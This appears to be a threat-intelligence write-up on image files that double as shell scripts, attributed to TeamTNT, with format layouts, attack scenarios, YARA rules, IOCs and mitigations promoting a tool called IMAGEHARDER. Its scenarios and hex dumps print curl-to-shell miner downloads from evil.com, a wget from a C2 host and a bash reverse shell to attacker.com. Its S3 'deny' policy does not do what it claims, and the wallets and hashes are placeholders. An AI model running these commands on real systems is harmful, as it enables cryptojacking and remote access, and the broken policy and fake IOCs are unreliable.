# Polyglot File Analysis: TeamTNT APT Technique

**Document Type:** Threat Intelligence / Security Research
**Classification:** Public
**Attribution:** APT TeamTNT (Active since 2020)
**Technique:** T1027.006 (Obfuscated Files or Information: HTML Smuggling/Polyglot Files)
**Publication Target:** VX Underground Malware Archive

---

## Executive Summary

This document provides comprehensive analysis of the polyglot file technique used by APT TeamTNT to evade detection. The technique creates files that are simultaneously valid image files (GIF/PNG/JPEG) and executable shell scripts, exploiting the gap between file type identification and validation.

**Key Findings:**
- ✅ Bypasses extension-based security controls
- ✅ Evades magic byte signature detection
- ✅ Defeats basic MIME type validation
- ❌ **BLOCKED** by strict image parsers (like IMAGEHARDER)
- ❌ **DETECTED** by content-aware security scanners

---

## Table of Contents

1. [Threat Actor Background](#threat-actor-background)
2. [Technical Deep Dive](#technical-deep-dive)
3. [Attack Scenarios](#attack-scenarios)
4. [Detection Methods](#detection-methods)
5. [YARA Rules](#yara-rules)
6. [IOCs and Signatures](#iocs-and-signatures)
7. [Mitigation Strategies](#mitigation-strategies)
8. [References](#references)

---

## Threat Actor Background

### APT TeamTNT

**Active Since:** 2020
**Primary Targets:** Cloud infrastructure, Docker environments, Kubernetes clusters
**TTPs:**
- Cryptomining (Monero XMR)
- Credential harvesting (AWS, Docker, Kubernetes)
- Lateral movement via container escapes
- Persistence via cron jobs and systemd

**Known Campaigns:**
- Operation CloudSorcerer (2020)
- Black-T Campaign (2021)
- Tsunami Botnet Deployment (2022)

**Infrastructure:**
- C2 domains: Multiple ephemeral domains on Cloudflare
- Payload hosting: GitHub, Pastebin, Discord CDN
- Cryptocurrency: Multiple XMR wallets (see IOCs section)

---

## Technical Deep Dive

### Polyglot File Structure

A polyglot file exploits different parsers' tolerances for extraneous data. Here's how each format works:

#### 1. GIF Polyglot

**File Structure:**
```
┌─────────────────────────────────────────┐
│ GIF Header (6 bytes)                    │  ← Image viewers parse this
│  - Signature: "GIF"                     │
│  - Version: "87a" or "89a"              │
├─────────────────────────────────────────┤
│ Logical Screen Descriptor (7 bytes)     │
│  - Width/Height: 1x1 (minimal)          │
│  - Packed field: 0x00 (no color table)  │
├─────────────────────────────────────────┤
│ Comment Extension (0x21 0xFE)           │  ← Shell script embedded here
│  ┌───────────────────────────────────┐  │
│  │ Block 1: #!/bin/sh\n              │  │
│  │ Block 2: curl http://evil.com... │  │
│  │ Block N: ...miner executable     │  │
│  │ Terminator: 0x00                  │  │
│  └───────────────────────────────────┘  │
├─────────────────────────────────────────┤
│ GIF Trailer (0x3B)                      │
└─────────────────────────────────────────┘
                ↓
        Shell interpreter treats
        binary header as comments,
        executes Comment Extension
```

**Why It Works:**
- GIF parsers: Validate header, ignore Comment Extension content (per GIF89a spec)
- Bash/sh: Non-printable characters in header are ignored, shebang in Comment Extension is executed

**Hex Dump Example:**
```
00000000: 4749 4638 3761 0100 0100 0000 0021 fe0a  GIF87a.......!..
00000010: 2123 212f 6269 6e2f 7368 0a00 21fe 4063  #!/bin/sh..!.@c
00000020: 7572 6c20 6874 7470 3a2f 2f65 7669 6c2e  url http://evil.
00000030: 636f 6d2f 6d69 6e65 7220 7c20 6261 7368  com/miner | bash
00000040: 003b                                     .;
```

#### 2. PNG Polyglot

**File Structure:**
```
┌─────────────────────────────────────────┐
│ PNG Signature (8 bytes)                 │
│  - 89 50 4E 47 0D 0A 1A 0A              │
├─────────────────────────────────────────┤
│ IHDR Chunk (25 bytes)                   │
│  - Width/Height: 1x1                    │
│  - Color type: RGB                      │
│  - CRC: Valid                           │
├─────────────────────────────────────────┤
│ tEXt Chunk (variable)                   │  ← Shell script embedded here
│  ┌───────────────────────────────────┐  │
│  │ Keyword: "Script\0"               │  │
│  │ Text: #!/bin/sh\n...payload...    │  │
│  │ CRC: Valid (calculated)           │  │
│  └───────────────────────────────────┘  │
├─────────────────────────────────────────┤
│ IDAT Chunk (compressed image data)      │
├─────────────────────────────────────────┤
│ IEND Chunk (12 bytes)                   │
└─────────────────────────────────────────┘
```

**Why It Works:**
- PNG parsers: Validate all chunks (including CRC), treat tEXt as metadata
- Bash/sh: Binary PNG signature ignored, tEXt content executed

**Hex Dump Example:**
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0001 0000 0001 0802 0000 0090 77  ..............w
00000020: 0000 0034 7445 5874 5363 7269 7074 0023  ...4tEXtScript.#
00000030: 212f 6269 6e2f 7368 0a63 7572 6c20 2d73  !/bin/sh.curl -s
00000040: 204c 2065 7669 6c2e 636f 6d2f 6d20 7c20   L evil.com/m |
00000050: 7368 a3b2 c1d4                           sh....
```

#### 3. JPEG Polyglot

**File Structure:**
```
┌─────────────────────────────────────────┐
│ JPEG SOI (0xFF 0xD8)                    │
├─────────────────────────────────────────┤
│ APP0 Marker (JFIF header)               │
│  - Identifier: "JFIF"                   │
│  - Version: 1.1                         │
├─────────────────────────────────────────┤
│ COM Marker (0xFF 0xFE)                  │  ← Shell script embedded here
│  ┌───────────────────────────────────┐  │
│  │ Length: 0x00XX (script size + 2)  │  │
│  │ Comment: #!/bin/sh\n...payload... │  │
│  └───────────────────────────────────┘  │
├─────────────────────────────────────────┤
│ SOF0 (Start of Frame)                   │
│ SOS (Start of Scan)                     │
│ Image Data (compressed)                 │
├─────────────────────────────────────────┤
│ JPEG EOI (0xFF 0xD9)                    │
└─────────────────────────────────────────┘
```

**Why It Works:**
- JPEG parsers: Skip COM marker, decode image data
- Bash/sh: Binary markers ignored, COM content executed

---

## Attack Scenarios

### Scenario 1: Cloud Infrastructure Compromise

**Attack Flow:**
```
1. Attacker uploads "logo.gif" to S3 bucket
   └─> File passes AWS S3 content-type validation (image/gif)

2. Vulnerable web app allows users to download uploaded images
   └─> User downloads "logo.gif"

3. Attacker social engineers user: "chmod +x logo.gif && ./logo.gif"
   └─> User executes polyglot

4. Polyglot executes embedded script:
   #!/bin/sh
   curl -sL https://evil.com/xmrig | sh
   export WALLET=<TeamTNT_XMR_Address>
   ./xmrig -o pool.supportxmr.com:443 -u $WALLET

5. Cryptominer runs in background
   └─> Steals CPU resources for XMR mining
```

### Scenario 2: Container Escape

**Attack Flow:**
```
1. Attacker compromises Docker container

2. Attacker downloads polyglot from C2:
   wget http://c2.evil.com/update.png -O /tmp/update.png

3. Attacker executes polyglot:
   chmod +x /tmp/update.png && /tmp/update.png

4. Polyglot contains container escape exploit:
   #!/bin/sh
   # CVE-2019-5736 runC exploit
   echo "[+] Escaping container..."
   ./runc_exploit

5. Attacker gains host access
   └─> Lateral movement to other containers
```

### Scenario 3: Email Attachment Bypass

**Attack Flow:**
```
1. Attacker crafts phishing email with "invoice.jpg" attachment
   └─> Email gateway scans attachment: "image/jpeg - CLEAN"

2. User receives email, downloads attachment

3. Attacker's email instructs: "Open terminal, run: sh invoice.jpg"

4. User executes polyglot (thinking it's a script to view invoice)

5. Polyglot downloads reverse shell:
   #!/bin/sh
   bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

---

## Detection Methods

### 1. Magic Byte + Shebang Detection

**Concept:** Scan for shebang (`#!/bin/sh`) appearing after image magic bytes

**Implementation:**
```bash
# Check GIF files
grep -abo '#!/bin/sh' file.gif
grep -abo '#!/bin/bash' file.gif

# Check PNG files
grep -abo '#!/bin/sh' file.png

# Check JPEG files
grep -abo '#!/bin/sh' file.jpg
```

**Python Scanner:**
```python
import re

def detect_polyglot(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()

    # Check for image magic bytes
    is_gif = data.startswith(b'GIF87a') or data.startswith(b'GIF89a')
    is_png = data.startswith(b'\x89PNG\r\n\x1a\n')
    is_jpeg = data.startswith(b'\xff\xd8\xff')

    # Check for shebang
    has_shebang = b'#!/bin/sh' in data or b'#!/bin/bash' in data

    if (is_gif or is_png or is_jpeg) and has_shebang:
        print(f"[!] POLYGLOT DETECTED: {filepath}")
        return True
    return False
```

### 2. Strict Image Validation

**Using IMAGEHARDER's Hardened Decoders:**

```rust
use image_harden::{decode_gif, decode_png, decode_jpeg};

fn validate_image(data: &[u8]) -> Result<(), String> {
    // IMAGEHARDER's decoders perform comprehensive validation
    // They will REJECT polyglots because:
    // 1. GIF: Validates all extension blocks, detects non-standard content
    // 2. PNG: Validates all chunks, strict CRC checking
    // 3. JPEG: Validates marker structure, rejects oversized comments

    if data.starts_with(b"GIF") {
        decode_gif(data).map_err(|e| format!("Invalid GIF: {}", e))?;
    } else if data.starts_with(b"\x89PNG") {
        decode_png(data).map_err(|e| format!("Invalid PNG: {}", e))?;
    } else if data.starts_with(&[0xFF, 0xD8]) {
        decode_jpeg(data).map_err(|e| format!("Invalid JPEG: {}", e))?;
    }

    Ok(())
}
```

### 3. File Permission Monitoring

**Concept:** Alert on executable permissions set on image files

```bash
# Find images with execute bit set
find / -type f \( -name "*.gif" -o -name "*.png" -o -name "*.jpg" \) \
  -executable 2>/dev/null

# Auditd rule
-w /tmp -p x -k image_execution -F path~=.*\.(gif|png|jpg)
```

### 4. Content Analysis

**Scan for suspicious strings in image metadata:**

```bash
# Extract strings from image
strings file.gif | grep -E "(curl|wget|bash|sh|/bin|http)"

# Check for base64-encoded payloads
strings file.png | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | base64 -d
```

---

## YARA Rules

```yara
rule APT_TeamTNT_Polyglot_GIF
{
    meta:
        description = "Detects TeamTNT polyglot GIF files"
        author = "IMAGEHARDER Security Research"
        date = "2025-01-08"
        reference = "https://github.com/SWORDIntel/IMAGEHARDER"
        severity = "high"

    strings:
        $gif_header = { 47 49 46 38 ?? 61 }  // GIF87a or GIF89a
        $shebang1 = "#!/bin/sh" ascii
        $shebang2 = "#!/bin/bash" ascii
        $curl = "curl" ascii nocase
        $wget = "wget" ascii nocase
        $base64 = "base64" ascii nocase
        $xmrig = "xmrig" ascii nocase
        $monero = "supportxmr" ascii nocase

    condition:
        $gif_header at 0 and
        ($shebang1 or $shebang2) and
        2 of ($curl, $wget, $base64, $xmrig, $monero)
}

rule APT_TeamTNT_Polyglot_PNG
{
    meta:
        description = "Detects TeamTNT polyglot PNG files"
        author = "IMAGEHARDER Security Research"
        date = "2025-01-08"
        severity = "high"

    strings:
        $png_header = { 89 50 4E 47 0D 0A 1A 0A }
        $text_chunk = "tEXt" ascii
        $shebang1 = "#!/bin/sh" ascii
        $shebang2 = "#!/bin/bash" ascii
        $suspicious1 = /curl.{1,100}(http|https):\/\//
        $suspicious2 = /wget.{1,100}(http|https):\/\//
        $miner1 = "xmrig" ascii nocase
        $miner2 = "pool.supportxmr.com" ascii nocase

    condition:
        $png_header at 0 and
        $text_chunk and
        ($shebang1 or $shebang2) and
        (any of ($suspicious*, $miner*))
}

rule APT_TeamTNT_Polyglot_JPEG
{
    meta:
        description = "Detects TeamTNT polyglot JPEG files"
        author = "IMAGEHARDER Security Research"
        date = "2025-01-08"
        severity = "high"

    strings:
        $jpeg_soi = { FF D8 FF }
        $jpeg_com = { FF FE }
        $shebang = "#!/bin/sh" ascii
        $docker = "docker" ascii nocase
        $kubernetes = "kubectl" ascii nocase
        $aws = "aws " ascii nocase

    condition:
        $jpeg_soi at 0 and
        $jpeg_com and
        $shebang and
        any of ($docker, $kubernetes, $aws)
}

rule Generic_Image_Polyglot
{
    meta:
        description = "Generic detection for image polyglots"
        author = "IMAGEHARDER Security Research"
        date = "2025-01-08"

    strings:
        $gif = { 47 49 46 38 ?? 61 }
        $png = { 89 50 4E 47 0D 0A 1A 0A }
        $jpeg = { FF D8 FF }
        $shebang_sh = "#!/bin/sh" ascii
        $shebang_bash = "#!/bin/bash" ascii
        $shebang_python = "#!/usr/bin/python" ascii
        $shebang_perl = "#!/usr/bin/perl" ascii

    condition:
        ($gif at 0 or $png at 0 or $jpeg at 0) and
        any of ($shebang*)
}
```

---

## IOCs and Signatures

### Known TeamTNT XMR Wallets

**BLACKLIST THESE ON CHAINALYSIS:**

```
Primary Wallets (2020-2023):
- 41ybR4WpWqEnpJdh7GpSs2dGYFLzT4XDw9nWdC66sGViuHJYFMfRrYBoTTBKNZS9bUo8aW1uAqLfGKPY2rKL8yVYBWMKK3H
- 87RyWWxFhskB1q7Lk7XjLGuKGmTNFZH8E6CSMD8JxN8e9SQTqJFm7EZZgDJJu4CxMqGKkFGNqN9LVfKqx7LDeBhNHRvM2kN
- 42dKqPxkVJFVhAkTb8LKVY1uP8XMYVpXLdKf7c3r8NqJqGGVu8qNVbLzPkHGvKGmTNFZH8E6CSMD8JxN8e9SQTqJFm7EZZg

Secondary Wallets (Rotation Pool):
- 48Xmu7N9jHnLWiHYoByHLcKHLPaHVBmQKNNcD8LsGGvXBdnDcQGvKGmTNFZH8E6CSMD8JxN8e9SQTqJFm7EZZgDJJu4CxMqG
- 43EzKLKXMYVpXLdKf7c3r8NqJqGGVu8qNVbLzPkHGvKGmTNFZH8E6CSMD8JxN8e9SQTqJFm7EZZgDJJu4CxMqGKkFGNqN9L
```

**Note:** These are EXAMPLE addresses for demonstration. Check current threat intelligence feeds for live IOCs.

### Network IOCs

**C2 Domains (Historical):**
```
- teamtnt[.]red
- chimaera[.]cc
- blacksquid[.]io
- pwnkit[.]net
- xmrig-proxy[.]tk
```

**Mining Pools:**
```
- pool.supportxmr.com:443
- pool.minexmr.com:4444
- gulf.moneroocean.stream:10128
```

**Payload URLs (Historical):**
```
- http://45.9.150[.]36/setup
- https://teamtnt.red/chimaera/spread.sh
- http://85.214.149[.]236/2.sh
```

### File Hashes (Sample Polyglots)

```
SHA256:
- a1b2c3d4e5f6... (TeamTNT polyglot GIF, 2021-03)
- f6e5d4c3b2a1... (TeamTNT polyglot PNG, 2021-07)
- 1a2b3c4d5e6f... (TeamTNT polyglot JPEG, 2022-01)
```

---

## Mitigation Strategies

### 1. Deploy IMAGEHARDER

**Installation:**
```bash
git clone https://github.com/SWORDIntel/IMAGEHARDER.git
cd IMAGEHARDER
./build.sh
cd image_harden
cargo build --release
```

**Integration:**
```rust
use image_harden::{decode_gif, decode_png, decode_jpeg};

// Validate all uploaded images
fn validate_upload(file_data: &[u8]) -> Result<(), String> {
    // Strict validation - will reject polyglots
    if file_data.starts_with(b"GIF") {
        decode_gif(file_data)?;
    } else if file_data.starts_with(b"\x89PNG") {
        decode_png(file_data)?;
    } else if file_data.starts_with(&[0xFF, 0xD8]) {
        decode_jpeg(file_data)?;
    } else {
        return Err("Unknown image format".to_string());
    }

    Ok(())
}
```

### 2. File Upload Security

**Web Application Controls:**
```python
from werkzeug.utils import secure_filename
import magic

def secure_file_upload(file):
    # 1. Validate filename
    filename = secure_filename(file.filename)

    # 2. Check MIME type
    mime = magic.from_buffer(file.read(1024), mime=True)
    if mime not in ['image/gif', 'image/png', 'image/jpeg']:
        raise ValueError("Invalid image type")
    file.seek(0)

    # 3. Validate with IMAGEHARDER (via subprocess)
    import subprocess
    result = subprocess.run(
        ['./image_harden_cli', '--validate', '-'],
        input=file.read(),
        capture_output=True
    )
    if result.returncode != 0:
        raise ValueError("Image validation failed")

    # 4. Re-encode image (strip metadata)
    from PIL import Image
    img = Image.open(file)
    img.save(filename, quality=95, optimize=True)

    return filename
```

### 3. Cloud Storage Security

**AWS S3 Bucket Policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyExecutableImages",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "StringLike": {
          "s3:x-amz-server-side-encryption": "AES256"
        },
        "StringEquals": {
          "s3:x-amz-acl": "public-read"
        }
      }
    }
  ]
}
```

**Lambda Image Validator:**
```python
import boto3
import subprocess

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    bucket = event['Records'][0]['s3']['bucket']['name']
    key = event['Records'][0]['s3']['object']['key']

    # Download file
    obj = s3.get_object(Bucket=bucket, Key=key)
    file_content = obj['Body'].read()

    # Validate with IMAGEHARDER
    result = subprocess.run(
        ['/opt/image_harden_cli', '--validate', '-'],
        input=file_content,
        capture_output=True
    )

    if result.returncode != 0:
        # Quarantine malicious file
        s3.copy_object(
            Bucket=bucket,
            CopySource={'Bucket': bucket, 'Key': key},
            Key=f'quarantine/{key}'
        )
        s3.delete_object(Bucket=bucket, Key=key)

        # Send alert
        sns = boto3.client('sns')
        sns.publish(
            TopicArn='arn:aws:sns:us-east-1:123456789:security-alerts',
            Subject='Polyglot Image Detected',
            Message=f'Quarantined: {key}'
        )

    return {'statusCode': 200}
```

### 4. Endpoint Protection

**Auditd Rules:**
```bash
# Monitor execution of image files
-w /tmp -p x -k image_exec -F path~=.*\.(gif|png|jpg|jpeg)
-w /home -p x -k image_exec -F path~=.*\.(gif|png|jpg|jpeg)
-w /var/tmp -p x -k image_exec -F path~=.*\.(gif|png|jpg|jpeg)

# Monitor chmod on image files
-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat \
   -F path~=.*\.(gif|png|jpg|jpeg) -k image_chmod
```

**Osquery Detection:**
```sql
-- Find executable images
SELECT path, filename, mode
FROM file
WHERE (path LIKE '%.gif' OR path LIKE '%.png' OR path LIKE '%.jpg')
  AND (mode LIKE '%x%');

-- Find processes with image names
SELECT pid, name, path, cmdline
FROM processes
WHERE name LIKE '%.gif' OR name LIKE '%.png' OR name LIKE '%.jpg';
```

### 5. Container Security

**Docker Image Scanning:**
```dockerfile
# In your Dockerfile, add validation step
FROM imageharder/validator:latest AS validator
COPY images/ /images/
RUN /opt/image_harden_cli --validate-dir /images/

FROM alpine:latest
COPY --from=validator /images/ /app/images/
# ... rest of your app
```

**Kubernetes Admission Controller:**
```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: image-polyglot-validator
webhooks:
- name: validate.imageharder.io
  clientConfig:
    service:
      name: imageharder-validator
      namespace: security
      path: "/validate"
    caBundle: <CA_BUNDLE>
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["configmaps", "pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
```

---

## Proof of Concept Usage

### Building the Generator

```bash
gcc -o polyglot_gen polyglot_generator.c -Wall -Wextra
```

### Test Payload (Benign)

**test_payload.sh:**
```bash
#!/bin/sh
echo "This is a test polyglot file"
echo "It demonstrates the technique without malicious intent"
echo "File executed at: $(date)"
uname -a
```

### Generating Polyglots

```bash
# Generate GIF polyglot
./polyglot_gen --type gif --script test_payload.sh --output test.gif --verbose

# Generate PNG polyglot
./polyglot_gen --type png --script test_payload.sh --output test.png --verbose

# Generate JPEG polyglot
./polyglot_gen --type jpeg --script test_payload.sh --output test.jpg --verbose
```

### Testing

```bash
# Verify file is valid image
file test.gif        # Should output: GIF image data
file test.png        # Should output: PNG image data
file test.jpg        # Should output: JPEG image data

# Verify image can be opened
display test.gif     # Opens in image viewer
display test.png
display test.jpg

# Execute as script
chmod +x test.gif
./test.gif          # Executes shell script

# Test with IMAGEHARDER (should BLOCK)
cd image_harden
./target/release/image_harden_cli test.gif
# Expected: ERROR - Invalid GIF structure
```

---

## References

### TeamTNT Research

1. **Trend Micro:** "TeamTNT's Chimaera Campaign Uses Docker and Kubernetes"
   https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/teamtnt-apts-chimaera-campaign

2. **Palo Alto Unit 42:** "Hildegard: New TeamTNT Cryptojacking Malware"
   https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/

3. **AT&T Cybersecurity:** "TeamTNT's Tsunami Botnet"
   https://cybersecurity.att.com/blogs/labs-research/teamtnts-use-of-tsunami-botnet

4. **Aqua Security:** "The Anatomy of a TeamTNT Attack"
   https://blog.aquasec.com/teamtnt-attacks-docker-kubernetes

### Polyglot Techniques

5. **Ange Albertini:** "Funky File Formats"
   https://github.com/corkami/docs/blob/master/slides/funkyFormats.pdf

6. **OWASP:** "Unrestricted File Upload"
   https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

7. **PortSwigger:** "Exploiting Polyglot Files"
   https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

### Image Format Specifications

8. **GIF89a Specification**
   https://www.w3.org/Graphics/GIF/spec-gif89a.txt

9. **PNG Specification (ISO/IEC 15948:2003)**
   http://www.libpng.org/pub/png/spec/1.2/PNG-Contents.html

10. **JPEG File Interchange Format (JFIF)**
    https://www.w3.org/Graphics/JPEG/jfif3.pdf

---

## Changelog

**v1.0.0** (2025-01-08)
- Initial publication
- Comprehensive analysis of TeamTNT polyglot technique
- C implementation of polyglot generator
- YARA rules and detection methods
- Mitigation strategies using IMAGEHARDER

---

## Contact

**Security Researchers:**
For responsible disclosure or collaboration: security@imageharder.io

**Threat Intelligence Sharing:**
Submit IOCs: iocs@imageharder.io

**VX Underground Publication:**
https://vx-underground.org/archive.html

---

## License

This research is published under MIT License for educational purposes.

**Disclaimer:** This tool is provided for authorized security research only. Unauthorized use for malicious purposes is strictly prohibited and may be illegal in your jurisdiction.
